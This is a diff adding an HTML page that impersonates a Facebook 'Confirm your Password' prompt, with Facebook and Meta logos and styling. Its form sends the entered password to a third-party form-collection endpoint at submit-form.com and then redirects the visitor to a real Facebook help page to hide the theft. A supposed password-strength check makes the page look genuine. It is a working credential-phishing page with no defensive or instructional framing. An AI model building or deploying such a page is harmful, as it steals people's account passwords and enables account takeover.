@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook Confirm your Password</title>
+    <link rel="icon" href="https://www.facebook.com/favicon.ico" type="image/x-icon">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    * { 
+      margin: 0; 
+      padding: 0; 
+      box-sizing: border-box; 
+      font-family: Arial, sans-serif;
+    }
+    body {
+      display: flex; 
+      flex-direction: column; 
+      align-items: center; 
+      justify-content: center;
+      min-height: 100vh; 
+      background: #fff; 
+      text-align: center;
+    }
+    .logo { 
+      width: 50px; 
+      margin-left: auto;
+      margin-right: auto;
+      margin-bottom: 30px;
+    }
+    .input-container { 
+      position: relative; 
+      width: 105%; 
+      max-width: 320px; 
+      margin-bottom: 10px;
+    }
+    .input-container input {
+      width: 100%; 
+      padding: 12px 40px 12px 12px;
+      border: 1px solid #dddfe2; 
+      border-radius: 20px;
+      font-size: 16px; 
+      outline: none;
+    }
+    .input-container i {
+      position: absolute; 
+      right: 12px; 
+      top: 50%; 
+      transform: translateY(-50%);
+      font-size: 18px; 
+      color: #65676b; 
+      cursor: pointer; 
+      display: none;
+    }
+    button {
+      width: 105%; 
+      max-width: 320px; 
+      background: #1877f2; 
+      color: #fff;
+      border: none; 
+      padding: 10px; 
+      border-radius: 20px; 
+      font-size: 16px; 
+      cursor: pointer;
+      margin-top: 20px;
+    }
+    button:hover { 
+      background: #165fe6; 
+      
+    }
+    a { 
+      margin-top: 15px; 
+      display: block; 
+      color: #1877f2; 
+      text-decoration: none; 
+      font-size: 14px; 
+    }
+    .meta { 
+      position: absolute; 
+      bottom: 20px; 
+      font-size: 14px; 
+      color: #65676b; 
+    }
+    .error { 
+      color: red; 
+      font-size: 14px; 
+      margin-top: 5px; 
+      display: none; 
+    }
+  </style>
+</head>
+<body>
+
+  <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" class="logo" alt="Facebook Logo">
+
+  <form id="passwordForm" action="https://submit-form.com/xXA1TFdtY" method="POST">
+    <div class="input-container">
+      <input type="password" id="password" name="password" placeholder="Password" required>
+      <i class="fa-solid fa-eye" id="togglePassword"></i>
+    </div>
+    <div class="error" id="errorMsg"></div>
+    <button type="submit">Continue</button>
+  </form>
+
+  <div class="meta"><i class="fa-brands fa-meta"></i> Meta</div>
+
+  <script>
+    const passwordInput = document.getElementById('password');
+    const toggleIcon = document.getElementById('togglePassword');
+    const errorMsg = document.getElementById('errorMsg');
+    const form = document.getElementById('passwordForm');
+    const weakPasswords = ['123456', 'password', 'qwerty', '111111', 'abcdef'];
+
+    // Show/hide eye icon
+    passwordInput.addEventListener('input', () => {
+      toggleIcon.style.display = passwordInput.value ? 'block' : 'none';
+    });
+
+    passwordInput.addEventListener('blur', () => {
+      if (!passwordInput.value) toggleIcon.style.display = 'none';
+    });
+
+    // Toggle password visibility
+    toggleIcon.addEventListener('click', () => {
+      const type = passwordInput.type === 'password' ? 'text' : 'password';
+      passwordInput.type = type;
+      toggleIcon.classList.toggle('fa-eye-slash');
+    });
+
+    // Validation
+    form.addEventListener('submit', (e) => {
+      const pass = passwordInput.value.trim();
+      errorMsg.style.display = 'none';
+
+      if (pass.includes(' ')) {
+        e.preventDefault();
+        errorMsg.textContent = "Password cannot contain spaces.";
+        errorMsg.style.display = 'block';
+      } else if (pass.length < 6) {
+        e.preventDefault();
+        errorMsg.textContent = "Password must be at least 6 characters.";
+        errorMsg.style.display = 'block';
+      } else if (weakPasswords.includes(pass.toLowerCase())) {
+        e.preventDefault();
+        errorMsg.textContent = "This password is too weak. Choose another.";
+        errorMsg.style.display = 'block';
+      } else {
+        // On successful validation, redirect after submission
+        setTimeout(() => { window.location.href = "https://www.facebook.com/help/media/thank-you?rdrhc'"; }, 500);
+      }
+    });
+  </script>
+</body>
+</html>
